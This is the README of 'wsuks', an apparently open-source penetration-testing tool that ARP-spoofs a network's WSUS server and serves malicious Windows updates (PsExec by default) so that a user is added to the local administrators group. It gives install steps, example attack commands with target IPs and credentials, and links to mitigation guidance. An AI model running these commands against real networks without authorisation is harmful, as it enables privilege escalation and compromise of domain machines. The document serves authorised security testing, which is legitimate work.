![Supported Python versions](https://img.shields.io/badge/python-3.8.1+-blue.svg) [![Twitter](https://img.shields.io/twitter/follow/al3x_n3ff?label=al3x_n3ff&style=social)](https://twitter.com/intent/follow?screen_name=al3x_n3ff)

❗️This project is still in beta and not fully working❗️

# wsuks
_Weaponizing the WSUS Attack_

Gaining local administrative access on a Windows machine that is part of a domain is typically the initial step towards acquiring domain admin privileges during a penetration test. In order to exploit the WSUS attack automatically, this tool spoofs the IP address of the WSUS server within the network using ARP, and when the client requests Windows updates, it provides its own malicious updates instead.
By default, a Windows client requests updates every 24 hours. 

Both the executable file served (Default: PsExec64.exe) and the executed command can be changed as needed.

Prerequisits:
- The target Client must be on the local network
- The Windows Server Update Service (WSUS) must be configured using HTTP

Result:
- After successful execution the user provided will be added to the local admin group. If no user was specified a user with the format user[0-9]{5} (e.g. user12345) and a random password will be created

## Installation
Using pipx (recommended):
```
sudo apt install python3-pipx
pipx ensurepath
pipx install wsuks
sudo ln -s ~/.local/pipx/venvs/wsuks/bin/wsuks /usr/local/bin/wsuks
```

Using poetry:
```
sudo apt install python3-poetry
git clone https://github.com/NeffIsBack/wsuks
cd wsuks
sudo poetry install
```

## Usage
❗wsuks must be run as root❗

Using pipx you can simply run `sudo wsuks ...` anywhere on the system.\
Using poetry you must be in the wsuks folder and begin every command with `sudo poetry run wsuks ...`

#### Specify known WSUS-Server and create local admin user:
```
sudo wsuks -t 10.0.0.10 --WSUS-Server 10.0.0.20
```
#### Specify known WSUS-Server and add provided domain user to local admin group (Domain is required!):
```
sudo wsuks -t 10.0.0.10 --WSUS-Server 10.0.0.20 -u User -p Password -d Domain.local
```
#### Autodiscover the WSUS-Server by only specifying the domain user with the dc-ip:
```
sudo wsuks -t 10.0.0.10 -u User -p Password -d Domain.local --dc-ip 10.0.0.1
```

## About & Mitigation
In the [PyWSUS](https://github.com/GoSecure/pywsus) Repository from GoSecure you can find a great documentation how to you could detect and mitigate this attack.
They also wrote a great Guide demonstrating how this attack works in detail [here](https://www.gosecure.net/blog/2020/09/03/wsus-attacks-part-1-introducing-pywsus/).

This Tool is based on the following projects:
- https://github.com/GoSecure/pywsus
- https://github.com/GoSecure/wsuspect-proxy

